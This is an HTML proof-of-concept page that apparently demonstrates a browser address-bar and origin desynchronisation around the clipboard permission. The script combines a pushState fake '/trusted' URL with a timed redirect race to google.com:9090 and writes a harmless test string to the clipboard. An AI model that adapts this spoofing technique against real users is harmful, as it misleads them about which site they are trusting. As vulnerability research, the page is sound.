<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>Clipboard Origin Desync PoC</title>
<meta name="viewport" content="width=device-width, initial-scale=1">

<style>
body {
  margin: 0;
  font-family: -apple-system, BlinkMacSystemFont, system-ui;
  background: #f5f5f7;
}

button {
  font-size: 15px;
  padding: 10px 14px;
  border-radius: 10px;
  border: none;
  background: #007aff;
  color: #fff;
}

#panel {
  display: none;
  max-width: 420px;
  margin: 80px auto;
  background: #fff;
  padding: 24px;
  border-radius: 16px;
  box-shadow: 0 20px 60px rgba(0,0,0,.2);
  text-align: center;
}

.notice {
  margin-top: 14px;
  font-size: 13px;
  color: #b00020;
}
</style>
</head>

<body>

<div style="text-align:center; margin-top:60px;">
  <button id="trigger">Start PoC</button>
</div>

<div id="panel">
  <h2>Clipboard Access</h2>
  <p>Tap the button below to write to clipboard.</p>

  <button onclick="writeClipboard()">Write Clipboard</button>
  <p id="output">Clipboard: -</p>

  <div class="notice">
    Demo only — observe origin / UI behavior
  </div>
</div>

<script>
const panel   = document.getElementById('panel');
const trigger = document.getElementById('trigger');
const output  = document.getElementById('output');

async function writeClipboard() {
  try {
    await navigator.clipboard.writeText('ORIGIN-DESYNC-TEST');
    output.textContent = 'Clipboard write OK';
  } catch (e) {
    output.textContent = 'Clipboard denied';
  }
}

/*
 * Step 1:
 * Make URL look trusted
 */
trigger.onclick = () => {
  history.pushState({}, '', '/trusted');
  panel.style.display = 'block';
};

/*
 * Step 2:
 * Navigation race after user gesture
 */
window.addEventListener('pageshow', () => {
  requestAnimationFrame(() => {
    requestAnimationFrame(() => {
      setTimeout(() => {
        location.href = 'https://google.com:9090';
      }, 80);
    });
  });
});
</script>

</body>
</html>
